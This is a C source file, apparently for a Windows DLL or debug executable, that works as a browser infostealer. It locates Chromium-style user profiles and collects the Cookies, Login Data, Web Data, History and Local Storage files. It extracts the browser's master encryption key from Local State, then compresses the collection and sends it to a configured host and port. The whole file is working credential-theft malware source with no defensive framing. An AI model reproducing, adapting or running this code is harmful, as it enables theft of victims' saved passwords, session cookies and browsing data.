#include "stdafx.h"
#include "utils.h"

#include "ffs/linear.h"
#include "b64/b64.h"
#include "pack/pack.h"


#ifdef _DEBUG_EXE
#define DLL_EXPORT
#else
#define DLL_EXPORT __declspec(dllexport)
#endif

#define ENDPOINT_HOST "127.0.0.1"
#define ENDPOINT_PORT 12345

#define TARGET_NAMES_COUNT 6
#define TARGET_EXT_COUNT 2


DLL_EXPORT int CALLBACK main()
{
    char* target = GetWinFolderById(&FOLDERID_LocalAppData);
    NULL_RET(target, EXIT_FAILURE);

    PathRemoveFileSpecA(target);


    FFSearch* results = FFCreateResult();
    NULL_RET(results, EXIT_FAILURE);

    FFSearchLinearDir(target, "blob_storage", results, results);
    free(target);

    Pack* pack = PackCreate();
    if (!pack)
    {
        FFDestroyResult(results);
        return EXIT_FAILURE;
    }

  
    const char* tnames[TARGET_NAMES_COUNT] = {
        "Network\\Cookies",
        "History",
        "Web Data",
        "Login Data",
        "Local State",
        "..\\Local State"
    };

    const char* textensions[TARGET_EXT_COUNT] = {
        ".ldb",
        ".log"
    };

    for (size_t i = 0; i < results->len; i++)
    {
        char* base = results->elements[i];
        PathRemoveFileSpecA(base);

        PackTargetFiles(pack, base, tnames, TARGET_NAMES_COUNT);
        
        char leveldb[MAX_PATH];
        if (PathCombineA(leveldb, base, "Local Storage\\leveldb\\"))
        {
            if (!PathIsDirectoryEmptyA(leveldb))
            {
                PackDirectoryFiles(pack, leveldb, textensions, TARGET_EXT_COUNT);
            }
        }

        char localstate[MAX_PATH];
        if (PathCombineA(localstate, base, "Local State"))
        {
            if (PathFileExistsA(localstate))
            {
                char* raw_key = GetEncryptionKeyString(localstate);
                char* master_key = ExtractEncyrptionKey(raw_key);

                if (master_key)
                {
                    char localstate_key[MAX_PATH];
                    PathCombineA(localstate_key, base, "Key");
                    PackWriteBuffer(pack, localstate_key, master_key, strlen(master_key) + 1);
                }

                SAFE_FREE(master_key);
                SAFE_FREE(raw_key);
            }
        }
    }

    FFDestroyResult(results);

    PackCompress(&pack);

    PackSend(pack, ENDPOINT_HOST, ENDPOINT_PORT);

    PackDestroy(pack);

    return EXIT_SUCCESS;
}


#ifdef _DEBUG_EXE
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ char* pCmdLine, _In_ int nCmdShow)
{   
    _CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);

    if (AllocConsole())
    {
        FILE* fDummy;

        freopen_s(&fDummy, "CONOUT$", "w", stdout);
        freopen_s(&fDummy, "CONOUT$", "w", stderr);
        freopen_s(&fDummy, "CONIN$", "r", stdin);

        clearerr(stdout);
        clearerr(stderr);
        clearerr(stdin);
    }

    main();
    
    _CrtDumpMemoryLeaks();
    return EXIT_SUCCESS;
}
#else
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) 
{
    return TRUE;
}
#endif  // _DEBUG_EXE